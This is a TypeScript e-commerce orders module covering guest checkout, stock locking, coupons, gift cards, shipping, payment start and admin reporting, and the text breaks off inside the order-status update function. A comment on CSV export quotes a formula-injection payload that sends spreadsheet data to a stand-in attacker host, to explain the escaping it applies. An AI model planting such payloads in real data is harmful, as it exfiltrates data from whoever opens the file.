/**
 * Orders — checkout write path + admin read/update.
 *
 * Checkout is guest (no auth): the storefront POSTs a cart, we re-price it
 * against the *published* product documents (never trusting client prices),
 * check stock, and persist an order to `orders`/`order_items`. Money is stored
 * in minor units (integer cents); product `data.price` is major units, so we
 * convert.
 *
 * Stock is CHECKED here but moved in `stock.ts`, after the payment is
 * confirmed — offline settlement decrements immediately, a gateway waits for
 * its capture webhook. Decrementing at checkout meant an abandoned redirect
 * held units nobody had bought.
 *
 * Route factories mirror `quote.ts` (public checkout) and the core admin routes
 * (permission-guarded list/get/update). Module-gating (commerce on/off) is done
 * by the thin API binders, since this module must not import the site config.
 */
import 'server-only';

import { and, desc, eq, gte, inArray, like, lte, ne, or, sql, type SQL } from 'drizzle-orm';
import { z } from 'zod';

import {
  ApiError,
  badRequest,
  conflict,
  created,
  createRoute,
  idParam,
  ECOMMERCE_GIFTWRAP_FEE_KEY,
  getSetting,
  localePrefix,
  logAudit,
  notFound,
  ok,
  paginated,
  sendGraphMail,
  siteOrigin,
} from '../../core';
import { emailColor } from '../../core/email/brand';
import { likeTerm } from '../../core/db/like';
import { assertNotLockedByOther, orderLockKey } from '../../core/locks';
import { localeOrDefault } from '../../core/paths';
import { adapter, getDb, schema } from '../../db';
import { orderStatusValues } from '../../db/adapters/mysql/schema/commerce';
import { PERMISSIONS, requireApiPerm } from '../auth';
import {
  getConfiguredPaymentProvider,
  getPaymentProvider,
  isOnlineProvider,
  listPaymentsForOrder,
  recordPayment,
  refundOrderPayment,
  syncPaymentsForOrderStatus,
} from './payments';
import { decrementStockForOrder, restockOrder } from './stock';
import { markConvertedByEmail } from './abandoned';
import { couponUsageError, couponUsageErrorLocked, getCoupons, validateCoupon } from './coupons';
import { clampQuantity, quantityRules } from './quantity';
import { lineUnavailableReason, orderableRow } from './orderable';
import { canMoveOrderStatus } from './order-status';
import { codAmountFor, rebaseCodAmount } from './shipping-methods';
import { DEFAULT_PRODUCT_TYPE, getSiteCurrency, resolvePrice } from './read';
import { computeOrderTotals, orderSummaryLines } from './totals';
import { listShipments, resolveShippingChoices } from './shipping-service';
import { getGiftCardConfig, redeemGiftCards } from './giftcards/service';
import {
  validateGiftCardPurchase,
  type GiftCardPurchase,
  type GiftCardPurchaseInput,
} from './giftcards/rules';
import {
  orderStatusAfterRefund,
  planOrderLines,
  refundableAmount,
  refundStillOwed,
  type StoredOrderLine,
} from './order-admin';
import {
  computeShipping,
  findPickupLocation,
  getShippingConfig,
  lineWeight,
  pickupAvailable,
  type DeliveryMethod,
} from './shipping';

/** Major units (e.g. 49.99) → integer minor units (cents). */
const toMinor = (major: number): number => Math.round(major * 100);

// ── Types ────────────────────────────────────────────────────────────────────

export interface CheckoutCustomer {
  name: string;
  email: string;
  phone?: string;
  // Optional — a digital-only order (§5) carries no delivery address.
  address1?: string;
  city?: string;
  postal?: string;
  country?: string;
}
export interface CheckoutLine {
  slug: string;
  variationId?: string;
  quantity: number;
  locale: string;
  /** For a gift card product: the amount, who it is for and when to send it. */
  giftCard?: GiftCardPurchaseInput;
}
export interface CheckoutInput {
  customer: CheckoutCustomer;
  notes?: string;
  couponCode?: string;
  locale: string;
  items: CheckoutLine[];
  /** Delivery vs store pickup (§8). Defaults to `ship`. */
  delivery?: DeliveryMethod;
  /** Chosen pickup location id, when `delivery` is `pickup`. */
  pickupLocationId?: string;
  /** GDPR: the customer accepted the terms (required, §9). */
  acceptTerms?: boolean;
  /** Marketing/newsletter opt-in (optional, §9). */
  marketingOptIn?: boolean;
  /** Gift wrapping requested (adds the gift-wrap fee, §9). */
  giftWrap?: boolean;
  /** Optional gift message. */
  giftMessage?: string;
  /** Gift card codes the customer typed at checkout. */
  giftCardCodes?: string[];
  /** The chosen shipping method (`shipping_methods.id`), when the shop offers a choice. */
  shippingMethodId?: number;
  /** The chosen locker, for a locker method. */
  lockerId?: string;
  lockerName?: string;
  /**
   * The account this order belongs to, when the shopper is signed in. Resolved
   * by the route from the customer session — never taken from the request body,
   * which anyone can write.
   */
  customerId?: number | null;
}

/** Parse a stored money setting (major-unit string) to a non-negative number. */
export function parseMoneyMajor(value: unknown): number {
  const n = typeof value === 'number' ? value : typeof value === 'string' ? Number(value.trim()) : NaN;
  return Number.isFinite(n) && n > 0 ? n : 0;
}

/** The configured gift-wrap fee (major units, 0 when unset). */
export async function getGiftWrapFee(): Promise<number> {
  return parseMoneyMajor(await getSetting(ECOMMERCE_GIFTWRAP_FEE_KEY));
}

type Localized = string | Record<string, string> | undefined;

// ── Helpers ──────────────────────────────────────────────────────────────────

/** Resolve a (possibly localized) label to a display string, with fallbacks. */
function resolveLoc(v: Localized, locale: string): string {
  if (typeof v === 'string') return v.trim();
  if (v && typeof v === 'object') {
    const pick = (l: string) => (typeof v[l] === 'string' && v[l].trim() ? v[l] : undefined);
    const any = Object.values(v).find((x) => typeof x === 'string' && x.trim());
    return (pick(locale) || any || '').trim();
  }
  return '';
}

interface RawVariation {
  id?: string;
  options?: Record<string, string>;
  price?: number;
  stock?: number;
  sku?: string;
}
interface RawAttrValue {
  id?: string;
  label?: Localized;
}
interface RawAttr {
  id?: string;
  name?: Localized;
  values?: RawAttrValue[];
}

function findVariation(data: Record<string, unknown>, variationId?: string): RawVariation | undefined {
  if (!variationId) return undefined;
  const variations = (Array.isArray(data.variations) ? data.variations : []) as RawVariation[];
  return variations.find((v) => v.id === variationId);
}

/** Human-readable "Color: Red, Size: M" from the selected variation. */
function variantLabel(data: Record<string, unknown>, variationId: string | undefined, locale: string): string | null {
  const v = findVariation(data, variationId);
  if (!v?.options) return null;
  const attributes = (Array.isArray(data.attributes) ? data.attributes : []) as RawAttr[];
  const parts: string[] = [];
  for (const a of attributes) {
    if (!a.id) continue;
    const valueId = v.options[a.id];
    if (!valueId) continue;
    const value = (a.values ?? []).find((x) => x.id === valueId);
    const name = resolveLoc(a.name, locale);
    const label = resolveLoc(value?.label, locale);
    if (label) parts.push(name ? `${name}: ${label}` : label);
  }
  return parts.length ? parts.join(', ') : null;
}

/** Throw a 400 when the requested quantity exceeds tracked stock. Untracked
 *  (undefined) stock means unlimited. */
function ensureStock(data: Record<string, unknown>, variationId: string | undefined, qty: number, name: string): void {
  const limits: number[] = [];
  if (typeof data.stock === 'number') limits.push(data.stock);
  const v = findVariation(data, variationId);
  if (typeof v?.stock === 'number') limits.push(v.stock);
  const available = limits.length ? Math.min(...limits) : Infinity;
  if (qty > available) {
    throw badRequest(`Not enough stock for "${name}" (${available} left).`);
  }
}

/**
 * The random half of an order reference.
 *
 * The reference used to be the autoincrement id, zero-padded — and the guest
 * order-lookup endpoint authorises on reference + email, so the secret half of
 * that pair was a number an outsider could simply count through. Anyone holding
 * a customer's email address (a leak, a mailing list, a guess at
 * firstname.lastname@) could walk the reference space and read that person's
 * order: items, address, phone. A sequential reference also tells every
 * customer exactly how many orders the shop has taken.
 *
 * Ten characters of Crockford base32 is ~50 bits — unguessable at the endpoint's
 * 20 requests/minute, while still short enough to read down a phone line and
 * type back in. `I`, `L`, `O` and `U` are excluded so it cannot be misread as
 * 1/0, which is the whole point of that alphabet.
 */
const REFERENCE_ALPHABET = '0123456789ABCDEFGHJKMNPQRSTVWXYZ';
function orderSuffix(): string {
  const bytes = crypto.getRandomValues(new Uint8Array(10));
  let out = '';
  for (const b of bytes) out += REFERENCE_ALPHABET[b % REFERENCE_ALPHABET.length];
  return out;
}

// ── Create (checkout) ────────────────────────────────────────────────────────

export async function createOrder(
  input: CheckoutInput,
  /** Site facts the core cannot read itself; the checkout route binder supplies them. */
  site: { defaultLocale: string },
): Promise<{
  id: number;
  reference: string;
  redirectUrl: string | null;
  /** Set by an in-page provider (Stripe); the storefront mounts a form on it. */
  clientSecret: string | null;
}> {
  if (input.items.length === 0) throw badRequest('Cart is empty.');
  // GDPR / terms: the order can't proceed without an explicit acceptance (§9).
  if (!input.acceptTerms) throw badRequest('Please accept the terms to place your order.');

  const [currency, shippingConfig, provider, coupons, giftWrapSetting, giftCardConfig] = await Promise.all([
    getSiteCurrency(),
    getShippingConfig(),
    getConfiguredPaymentProvider(),
    getCoupons(),
    getSetting(ECOMMERCE_GIFTWRAP_FEE_KEY),
    getGiftCardConfig(),
  ]);
  const giftWrap = input.giftWrap ? toMinor(parseMoneyMajor(giftWrapSetting)) : 0;

  // Store pickup (§8) — server-authoritative: the option must be on, and when
  // locations are configured the customer must have picked one that still exists.
  const wantsPickup = input.delivery === 'pickup';
  if (wantsPickup && !pickupAvailable(shippingConfig)) {
    throw badRequest('Store pickup is not available.');
  }
  const pickupLocation = wantsPickup ? findPickupLocation(shippingConfig, input.pickupLocationId) : undefined;
  if (wantsPickup && shippingConfig.pickup.locations.length > 0 && !pickupLocation) {
    throw badRequest('Please choose a pickup location.');
  }

  // Enforce coupon usage/per-customer limits before we start writing (limits
  // are derived from existing orders — see couponUsageError).
  if (input.couponCode) {
    const code = input.couponCode.trim().toLowerCase();
    const coupon = coupons.find((c) => c.code.trim().toLowerCase() === code);
    if (coupon) {
      const usage = await couponUsageError(coupon, input.customer.email);
      if (usage === 'usage_limit') throw badRequest('This coupon has reached its usage limit.');
      if (usage === 'customer_limit') throw badRequest('You have already used this coupon.');
    }
  }

  const db = getDb();
  const year = new Date().getFullYear();

  const result = await db.transaction(async (tx) => {
    const itemRows: (typeof schema.orderItems.$inferInsert)[] = [];
    let subtotal = 0;
    let totalWeight = 0;
    // A digital-only order skips shipping + the delivery address (§5).
    let allVirtual = true;

    for (const line of input.items) {
      // Requested quantity, then snapped to the product's purchase limits below
      // (server-authoritative — the client stepper/cart can't be trusted).
      const requestedQty = Math.max(1, Math.floor(line.quantity));
      // All locale rows of this product (authoritative, transaction-local).
      //
      // `FOR UPDATE` is what makes the stock check mean anything. Without it,
      // two checkouts for the last unit both read stock = 1, both pass
      // ensureStock(), and both write the decrement — the shop oversells and
      // neither customer is told. The lock makes the second transaction wait
      // for the first to commit, so it reads the already-decremented value and
      // is refused. Every locale row is locked because stock is shared across
      // them and all of them are written below.
      const rows = await tx
        .select()
        .from(schema.documents)
        .where(and(eq(schema.documents.type, DEFAULT_PRODUCT_TYPE), eq(schema.documents.slug, line.slug)))
        .for('update');

      // Published rows only: a draft or unpublished product is not for sale,
      // whatever slug the browser sends.
      const published = orderableRow(rows, line.locale);
      if (!published) throw badRequest(`Product "${line.slug}" is no longer available.`);

      const data = published.data as Record<string, unknown>;
      const name = String(data.title ?? published.metaTitle ?? line.slug);

      // External products, unknown or disabled variations, and "out of stock"
      // on an untracked product — see `lineUnavailableReason`.
      const unavailable = lineUnavailableReason(data, line.variationId);
      if (unavailable === 'unknown_variation' || unavailable === 'variation_disabled') {
        throw badRequest(`The option you chose for "${name}" is no longer available.`);
      }
      if (unavailable === 'out_of_stock') throw badRequest(`"${name}" is out of stock.`);
      if (unavailable) throw badRequest(`"${name}" cannot be bought here.`);

      /*
       * A gift card is priced by what the shopper chose, not by the product.
       * That amount came from their browser, so it is checked against the
       * shop's gift card settings here — the product page's limits are a
       * convenience, this is the control. One card per line: each line is one
       * recipient, and `issueGiftCardsForOrder` mints one card per line.
       */
      const isGiftCard = data.productType === 'giftcard';
      let giftCard: GiftCardPurchase | null = null;
      if (isGiftCard) {
        const checked = validateGiftCardPurchase(giftCardConfig, line.giftCard);
        if (!checked.ok) throw badRequest(checked.message);
        giftCard = checked.value;
      }

      // Snap to the product's purchase limits (§6) before stocking + pricing.
      const qty = giftCard ? 1 : clampQuantity(quantityRules(data), requestedQty);

      ensureStock(data, line.variationId, qty, name);

      // A gift card is emailed, so like a download it has nothing to ship.
      if (data.productType !== 'digital' && !giftCard) allVirtual = false;

      const unitPrice = giftCard ? giftCard.amount : toMinor(resolvePrice(data, line.variationId));
      const lineTotal = unitPrice * qty;
      subtotal += lineTotal;
      if (!giftCard) totalWeight += lineWeight(data, line.variationId) * qty;

      itemRows.push({
        orderId: 0, // set after the order row exists
        productId: published.id,
        sku: findVariation(data, line.variationId)?.sku ?? (typeof data.sku === 'string' ? data.sku : null),
        name,
        // Persisted so the post-payment decrement and any later restock know
        // which variation to move; the label and snapshot cannot say.
        variationId: line.variationId ?? null,
        variantLabel: giftCard
          ? `→ ${giftCard.recipientName ?? giftCard.recipientEmail}`
          : variantLabel(data, line.variationId, line.locale),
        unitPrice,
        quantity: qty,
        lineTotal,
        // `giftCard` on the snapshot is what `issueGiftCardsForOrder` mints from.
        snapshot: giftCard ? { ...data, giftCard } : data,
      });

      // NOTE: stock is NOT decremented here. `ensureStock` above refuses an
      // order that cannot be met, but the units only leave the shelf when the
      // payment is confirmed (`decrementStockForOrder`, called from the webhook
      // or immediately below for offline settlement). Decrementing at checkout
      // meant an abandoned gateway redirect held stock indefinitely.
    }

    // Coupon discount (server-authoritative — re-validated against the subtotal).
    let discount = 0;
    let couponCode: string | null = null;
    if (input.couponCode) {
      const res = validateCoupon(coupons, input.couponCode, subtotal);
      if (!res.valid) throw badRequest('This coupon is no longer valid.');
      discount = res.discount;
      couponCode = res.code;

      // Re-check the usage limits HERE, under the transaction's lock. The check
      // above the transaction is only advisory — it counts redemptions before
      // any row is written, so two simultaneous checkouts of a single-use code
      // both saw zero and both went through. This one counts under `FOR UPDATE`,
      // so the second transaction waits, sees the first redemption and is
      // rejected; the throw rolls the whole order back.
      const applied = coupons.find((c) => c.code.trim().toLowerCase() === res.code.trim().toLowerCase());
      if (applied) {
        const usage = await couponUsageErrorLocked(tx, applied, input.customer.email);
        if (usage === 'usage_limit') throw badRequest('This coupon has reached its usage limit.');
        if (usage === 'customer_limit') throw badRequest('You have already used this coupon.');
      }
    }

    // A physical order needs a delivery address — unless it's collected in store.
    // A digital-only one never does.
    if (!allVirtual && !wantsPickup && !input.customer.address1) {
      throw badRequest('A delivery address is required.');
    }

    // Shipping + payment surcharge (server-authoritative), added to the total.
    // A digital-only order has neither — nothing to ship. Pickup charges the
    // store-pickup fee instead of shipping.
    /*
     * Two shipping engines, and the newer one only takes over when a shop has
     * actually defined methods. A site that never opens that screen keeps the
     * flat/weight/zone calculation it has always had, to the cent.
     */
    let chosenMethod: Awaited<ReturnType<typeof resolveShippingChoices>>[number] | null = null;
    if (!allVirtual && input.shippingMethodId) {
      const choices = await resolveShippingChoices({
        country: input.customer.country ?? '',
        subtotalCents: subtotal,
        totalWeight,
        paymentProvider: provider.key,
        // One provider site-wide: an offline one is paid on delivery, so a
        // method that does not allow cash on delivery is not on offer.
        codSelected: !isOnlineProvider(provider),
      });
      chosenMethod = choices.find((choice) => choice.id === input.shippingMethodId) ?? null;
      // Re-quoted server-side: a method id from the body is a request, not a price.
      if (!chosenMethod) throw badRequest('That delivery option is no longer available.');
      if (chosenMethod.kind === 'locker' && !input.lockerId) {
        throw badRequest('Please choose a locker for this delivery option.');
      }
    }

    const { shipping, surcharge } = allVirtual
      ? { shipping: 0, surcharge: 0 }
      : chosenMethod
        ? { shipping: chosenMethod.cost, surcharge: chosenMethod.surcharge }
        : computeShipping(shippingConfig, {
            subtotalCents: subtotal,
            totalWeight,
            country: input.customer.country ?? '',
            providerKey: provider.key,
            delivery: wantsPickup ? 'pickup' : 'ship',
          });
    const { total } = computeOrderTotals({ subtotal, discount, shipping, surcharge, giftWrap });

    const orderMetadata: Record<string, unknown> = {
      shipping: {
        phone: input.customer.phone ?? null,
        address1: input.customer.address1 ?? null,
        city: input.customer.city ?? null,
        postal: input.customer.postal ?? null,
        country: input.customer.country ?? null,
        ...(allVirtual ? { virtual: true } : {}),
        /*
         * The method's name and cost are copied here, not just referenced:
         * renaming or re-pricing a method later must not rewrite what an old
         * order says the customer chose and paid.
         */
        ...(chosenMethod
          ? {
              method: chosenMethod.kind === 'pickup' ? 'pickup' : 'ship',
              shippingMethod: {
                id: chosenMethod.id,
                name: chosenMethod.name,
                courier: chosenMethod.courier,
                kind: chosenMethod.kind,
                cost: chosenMethod.cost,
              },
              ...(input.lockerId
                ? { locker: { id: input.lockerId, name: input.lockerName ?? '' } }
                : {}),
            }
          : {}),
        // Fulfilment method (§8) — recorded so the merchant sees "collect in
        // store" (and which store) rather than an empty address.
        ...(wantsPickup && !allVirtual
          ? {
              method: 'pickup',
              pickup: pickupLocation
                ? { id: pickupLocation.id, name: pickupLocation.name, address: pickupLocation.address ?? null }
                : null,
            }
          : {}),
      },
      // Cost breakdown in minor units (subtotal is the `subtotal` column).
      costs: { shipping, surcharge, discount, giftWrap },
      ...(couponCode ? { coupon: couponCode } : {}),
      // Consent record (§9): terms are mandatory; marketing is opt-in.
      consent: { terms: true, marketing: Boolean(input.marketingOptIn), at: new Date().toISOString() },
      ...(input.giftWrap || input.giftMessage
        ? { gift: { wrap: Boolean(input.giftWrap), message: input.giftMessage ?? null } }
        : {}),
    };
    // Insert with a temporary unique reference (must fit `varchar(32)`), then
    // set the human reference below. A dash-less uuid is 32 hex chars; slice to
    // leave headroom.
    const insertResult = await tx.insert(schema.orders).values({
      reference: crypto.randomUUID().replace(/-/g, '').slice(0, 30),
      status: 'pending',
      email: input.customer.email,
      customerId: input.customerId ?? null,
      shippingMethodId: chosenMethod?.id ?? null,
      customerName: input.customer.name,
      currency,
      subtotal,
      total,
      locale: localeOrDefault(input.locale, site.defaultLocale),
      notes: input.notes ?? null,
      metadata: orderMetadata,
    });
    const orderId = adapter.insertId(insertResult);
    const reference = `ORD-${year}-${orderSuffix()}`;
    await tx.update(schema.orders).set({ reference }).where(eq(schema.orders.id, orderId));

    for (const item of itemRows) {
      await tx.insert(schema.orderItems).values({ ...item, orderId });
    }

    /*
     * Gift cards are spent here, inside the order's own transaction and after
     * the order exists to attach the payment rows to. They are a way of PAYING,
     * so `total` is untouched: only `amountDue` — what the gateway is asked for
     * — goes down. Anything else would misstate what the shop sold.
     */
    const redemption = input.giftCardCodes?.length
      ? await redeemGiftCards(tx, {
          codes: input.giftCardCodes,
          orderId,
          amountDue: total,
          currency,
        })
      : { applied: [], amountDue: total };

    // Cash on delivery: what the courier collects, after gift cards. Read by
    // the voucher (`createShipment`), which books the parcel as COD with it.
    const codAmount = codAmountFor({
      online: isOnlineProvider(provider),
      delivered: !allVirtual && !wantsPickup && chosenMethod?.kind !== 'pickup',
      amountDue: redemption.amountDue,
    });
    if (codAmount !== undefined) {
      await tx
        .update(schema.orders)
        .set({ metadata: { ...orderMetadata, codAmount } })
        .where(eq(schema.orders.id, orderId));
    }

    return { id: orderId, reference, total, amountDue: redemption.amountDue };
  });

  // Initiate with the configured provider and record the payment row. Manual
  // returns nothing and the order stays `pending` until someone marks it paid;
  // a gateway returns a redirect (PayPal) or a client secret (Stripe), and the
  // order becomes `paid` only when its webhook confirms the money moved.
  /*
   * A gift card can cover the whole order, and then there is nothing for a
   * gateway to charge: asking Stripe for €0 is an error, and sending the
   * customer to a payment page for nothing is worse.
   */
  if (result.amountDue === 0) {
    const { settleFullyCoveredOrder } = await import('./giftcards/settle');
    await settleFullyCoveredOrder(result.id);
    return { id: result.id, reference: result.reference, redirectUrl: null, clientSecret: null };
  }

  const init = await provider.start({
    subject: 'order',
    subjectId: result.id,
    reference: result.reference,
    amount: result.amountDue,
    currency,
    email: input.customer.email,
    returnUrl: `${siteOrigin()}${localePrefix(input.locale, site.defaultLocale)}/order?ref=${encodeURIComponent(result.reference)}`,
  });
  await recordPayment({
    orderId: result.id,
    provider: provider.key,
    status: init.status,
    amount: result.amountDue,
    currency,
    providerRef: init.providerRef,
    method: init.method,
    error: init.error,
  });

  // Offline settlement has no webhook to wait for, so the units leave the shelf
  // now — the order is genuinely placed, it is only the money that is pending.
  // A gateway's stock moves when its capture event arrives instead.
  if (!isOnlineProvider(provider)) {
    await decrementStockForOrder(result.id);
  }

  // Marketing opt-in (§9): best-effort newsletter subscription. Never fails the
  // order; the consent is also recorded on the order metadata regardless.
  if (input.marketingOptIn) {
    try {
      await subscribeNewsletter(input.customer.email, localeOrDefault(input.locale, site.defaultLocale));
    } catch (err) {
      console.error('[commerce/checkout] newsletter opt-in failed', err);
    }
  }

  // Close any abandoned-cart record for this shopper so no reminder goes out.
  try {
    await markConvertedByEmail(input.customer.email);
  } catch (err) {
    console.error('[commerce/checkout] abandoned-cart convert failed', err);
  }

  return {
    id: result.id,
    reference: result.reference,
    redirectUrl: init.redirectUrl ?? null,
    clientSecret: init.clientSecret ?? null,
  };
}

/** Best-effort newsletter subscription from a checkout opt-in. Idempotent on email. */
async function subscribeNewsletter(email: string, locale: string): Promise<void> {
  const db = getDb();
  await db
    .insert(schema.newsletterSubscribers)
    .values({
      email,
      locale,
      consentText: 'Marketing opt-in at checkout',
      sourcePageSlug: '/checkout',
    })
    .onDuplicateKeyUpdate({ set: { updatedAt: new Date() } });
}

// ── Admin read/update ────────────────────────────────────────────────────────

export interface ListOrdersOptions {
  /** Reference, email or customer name. */
  search?: string;
  page?: number;
  pageSize?: number;
  status?: (typeof orderStatusValues)[number];
}

export async function listOrders(opts: ListOrdersOptions = {}) {
  const db = getDb();
  const page = Math.max(1, opts.page ?? 1);
  const pageSize = Math.min(100, Math.max(1, opts.pageSize ?? 25));
  /*
   * Reference, email or customer name.
   *
   * "Find the order for the customer on the phone" is the most common thing anyone does on
   * this screen, and the only tools were a status filter and paging. Those are the three
   * things a customer can actually tell you.
   */
  const term = opts.search?.trim();
  const match = term
    ? or(
        like(schema.orders.reference, likeTerm(term)),
        like(schema.orders.email, likeTerm(term)),
        like(schema.orders.customerName, likeTerm(term)),
      )
    : undefined;
  const statusWhere = opts.status ? eq(schema.orders.status, opts.status) : undefined;
  const where = statusWhere && match ? and(statusWhere, match) : (statusWhere ?? match);

  const [{ total }] = await db
    .select({ total: sql<number>`count(*)` })
    .from(schema.orders)
    .where(where);

  const items = await db
    .select()
    .from(schema.orders)
    .where(where)
    .orderBy(desc(schema.orders.createdAt))
    .limit(pageSize)
    .offset((page - 1) * pageSize);

  return { items, total: Number(total), page, pageSize };
}

// ── Reporting / CSV export ───────────────────────────────────────────────────

export interface OrderReportFilter {
  status?: (typeof orderStatusValues)[number];
  /** ISO datetime bounds (inclusive). */
  from?: string;
  to?: string;
}

function reportConditions(opts: OrderReportFilter): SQL | undefined {
  const conds: SQL[] = [];
  if (opts.status) conds.push(eq(schema.orders.status, opts.status));
  if (opts.from) {
    const d = new Date(opts.from);
    if (!Number.isNaN(d.getTime())) conds.push(gte(schema.orders.createdAt, d));
  }
  if (opts.to) {
    const d = new Date(opts.to);
    if (!Number.isNaN(d.getTime())) conds.push(lte(schema.orders.createdAt, d));
  }
  return conds.length ? and(...conds) : undefined;
}

export interface OrderStats {
  count: number;
  /** Revenue in minor units (cents) — totals excluding cancelled/refunded. */
  revenue: number;
  byStatus: Record<string, { count: number; revenue: number }>;
}

export async function orderStats(opts: OrderReportFilter = {}): Promise<OrderStats> {
  const db = getDb();
  const rows = await db
    .select({
      status: schema.orders.status,
      n: sql<number>`count(*)`,
      rev: sql<number>`coalesce(sum(${schema.orders.total}), 0)`,
    })
    .from(schema.orders)
    .where(reportConditions(opts))
    .groupBy(schema.orders.status);

  const byStatus: Record<string, { count: number; revenue: number }> = {};
  let count = 0;
  let revenue = 0;
  for (const r of rows) {
    const n = Number(r.n);
    const rev = Number(r.rev);
    byStatus[r.status] = { count: n, revenue: rev };
    count += n;
    if (r.status !== 'cancelled' && r.status !== 'refunded') revenue += rev;
  }
  return { count, revenue, byStatus };
}

/**
 * One CSV cell — quote-escaped AND formula-neutralised.
 *
 * Quoting alone is not enough: Excel, LibreOffice and Sheets evaluate any cell
 * whose text begins with `=`, `+`, `-` or `@` as a formula, quotes included. The
 * name and email on an order come from the PUBLIC checkout endpoint, so a guest
 * could order under the name `=HYPERLINK("http://evil/?"&A1,"Click")` and have
 * it execute the moment an admin opens orders.csv — DDE/formula injection, with
 * the admin's own machine as the target.
 *
 * A leading apostrophe is the standard neutraliser: every spreadsheet reads the
 * rest of the cell as literal text, and it is the only character they all agree
 * on. Leading tab/CR are stripped since they let the trigger character hide
 * behind whitespace.
 */
const csvCell = (v: unknown): string => {
  const raw = String(v ?? '').replace(/^[\t\r\n]+/, '');
  const safe = /^[=+\-@]/.test(raw) ? `'${raw}` : raw;
  return `"${safe.replace(/"/g, '""')}"`;
};
const major = (cents: unknown): string => ((Number(cents) || 0) / 100).toFixed(2);

/** Orders (optionally filtered) as a CSV string — one row per order, money in
 *  major units. */
export async function exportOrdersCsv(opts: OrderReportFilter = {}): Promise<string> {
  const db = getDb();
  const orders = await db
    .select()
    .from(schema.orders)
    .where(reportConditions(opts))
    .orderBy(desc(schema.orders.createdAt));

  const ids = orders.map((o) => o.id);
  const items = ids.length
    ? await db.select().from(schema.orderItems).where(inArray(schema.orderItems.orderId, ids))
    : [];
  const itemsByOrder = new Map<number, typeof items>();
  for (const it of items) {
    const list = itemsByOrder.get(it.orderId) ?? [];
    list.push(it);
    itemsByOrder.set(it.orderId, list);
  }

  const header = [
    'Reference',
    'Date',
    'Status',
    'Email',
    'Customer',
    'Currency',
    'Subtotal',
    'Discount',
    'Shipping',
    'Surcharge',
    'Total',
    'Coupon',
    'Items',
  ];
  const lines = [header.map(csvCell).join(',')];
  for (const o of orders) {
    const meta = (o.metadata ?? {}) as {
      costs?: { shipping?: number; surcharge?: number; discount?: number };
      coupon?: string;
    };
    const costs = meta.costs ?? {};
    const itemsStr = (itemsByOrder.get(o.id) ?? [])
      .map((i) => `${i.name}${i.variantLabel ? ` (${i.variantLabel})` : ''} x${i.quantity}`)
      .join('; ');
    lines.push(
      [
        o.reference,
        o.createdAt.toISOString(),
        o.status,
        o.email,
        o.customerName ?? '',
        o.currency,
        major(o.subtotal),
        major(costs.discount),
        major(costs.shipping),
        major(costs.surcharge),
        major(o.total),
        meta.coupon ?? '',
        itemsStr,
      ].map(csvCell).join(','),
    );
  }
  return lines.join('\r\n');
}

export async function getOrder(id: number) {
  const db = getDb();
  const [order] = await db.select().from(schema.orders).where(eq(schema.orders.id, id)).limit(1);
  if (!order) return null;
  const items = await db.select().from(schema.orderItems).where(eq(schema.orderItems.orderId, id));
  const payments = await listPaymentsForOrder(id);
  return { ...order, items, payments };
}

/** Can this provider key send money back online? (Unknown keys fall back to manual.) */
function refundsOnline(key: string): boolean {
  const provider = getPaymentProvider(key);
  return provider.key === key && typeof provider.refund === 'function';
}

/**
 * An order as the admin panel reads it: each payment says how much of it can
 * still be refunded, and the parcels come along. Never used for the customer
 * lookup, which has its own allow-list (`publicOrder`).
 */
export async function getAdminOrder(id: number) {
  const order = await getOrder(id);
  if (!order) return null;
  const payments = order.payments.map((payment) => ({
    ...payment,
    refundable: refundableAmount(payment, refundsOnline),
  }));
  return {
    ...order,
    payments,
    // Money taken for an order that will not be filled, still not sent back.
    refundDue: refundStillOwed(order.metadata, payments),
    shipments: await listShipments(id),
  };
}

/**
 * The fields of a payment row a *customer* may see.
 *
 * `payments` is selected whole by `listPaymentsForOrder`, which is right for the
 * admin and wrong for `lookupOrder` — the public guest endpoint returned
 * `getOrder()` verbatim, so `metadata` and `error` went out too: provider
 * references, gateway internals, the raw text of a decline, and now the
 * `refundedAmount` bookkeeping. None of it means anything to a shopper and all
 * of it describes our integration.
 *
 * An allow-list rather than a delete-list, so a column added to `payments` later
 * is private until someone decides otherwise.
 */
function publicPayment(payment: Awaited<ReturnType<typeof listPaymentsForOrder>>[number]) {
  return {
    id: payment.id,
    provider: payment.provider,
    status: payment.status,
    amount: payment.amount,
    currency: payment.currency,
    method: payment.method,
    createdAt: payment.createdAt,
  };
}

/**
 * An order as the customer-facing lookup returns it: the same shape, minus the
 * parts of each payment row that exist for us rather than for them.
 */
function publicOrder(order: NonNullable<Awaited<ReturnType<typeof getOrder>>>) {
  return { ...order, payments: order.payments.map(publicPayment) };
}

/** Statuses that put an order's units back on the shelf. */
const RESTOCKING_STATUSES = new Set(['cancelled', 'refunded']);

export async function updateOrderStatus(
  id: number,
  status: (typeof orderStatusValues)[number],
  opts: {
    /**
     * Only change the order if it is still in this status, and do nothing else
     * (no payment sync, no restock, no email) if it is not. For automated
     * callers that decided on a snapshot — a capture webhook may have moved the
     * order on in between. Returns `null` when the order had moved.
     */
    onlyFrom?: (typeof orderStatusValues)[number];
    /**
     * Do nothing (no restock, no gift card reversal, no email) if the order is
     * already in `status`, decided by the UPDATE itself so two callers racing
     * to the same status cannot both act. The admin refund route and the
     * provider's refund webhook both move an order to `refunded`; whichever
     * lands second must not send the customer a second refund email. Returns
     * `null` when the order was already there.
     */
    unlessAlready?: boolean;
  } = {},
) {
  const db = getDb();
  const conditions = [eq(schema.orders.id, id)];
  if (opts.onlyFrom) conditions.push(eq(schema.orders.status, opts.onlyFrom));
  if (opts.unlessAlready) conditions.push(ne(schema.orders.status, status));
  const res = await db
    .update(schema.orders)
    .set({ status })
    .where(and(...conditions));
  if ((opts.onlyFrom || opts.unlessAlready) && adapter.affectedRows(res) === 0) return null;
  // Keep MANUAL payment rows in step; a gateway's rows are the webhook's to write.
  await syncPaymentsForOrderStatus(id, status);

  // Put the units back when an order is cancelled or refunded. No guard on the
  // previous status is needed: `restockOrder` is idempotent and knows from the
  // order's own `stockTaken` flag whether there is anything to return — which
  // is the only thing that can distinguish an offline order (decremented at
  // creation, while `pending`) from a gateway order still awaiting payment.
  if (RESTOCKING_STATUSES.has(status)) {
    await restockOrder(id);
    // And the gift card balances the order took. Idempotent, so a second
    // cancellation (or a re-run of the stale-order job) puts nothing back twice.
    const { reverseGiftCardRedemptions } = await import('./giftcards/service');
    await reverseGiftCardRedemptions(id);
  }

  /*
   * A manual payment (bank transfer, cash) is confirmed by an admin marking the
   * order paid — the only "capture" it will ever get — so that is when the gift
   * cards it bought are minted. Idempotent per order line, like the webhook's
   * call, and never allowed to fail the status change.
   */
  if (status === 'paid') {
    try {
